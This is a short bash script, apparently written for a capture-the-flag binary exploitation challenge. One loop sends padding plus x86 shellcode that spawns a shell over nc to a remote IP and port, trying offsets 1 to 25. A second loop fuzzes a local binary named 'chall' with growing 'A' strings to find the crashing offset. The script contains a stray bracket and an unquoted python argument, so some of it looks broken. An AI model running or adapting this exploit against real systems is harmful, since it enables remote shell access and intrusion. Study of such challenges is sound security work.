#!/bin/bash

for i in {1..25}
do
	(python2 -c print 'a'*$i + "\x31\xc0\xbb\x08\x84\x04\x08\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"; cat) | nc 103.145.226.170 2021
done
]

for i in $(seq 1 50);do ./chall $(python -c "print 'A' * $i") 1>&2>/dev/null;[ $? -eq 139 ] && echo $i && break; done;
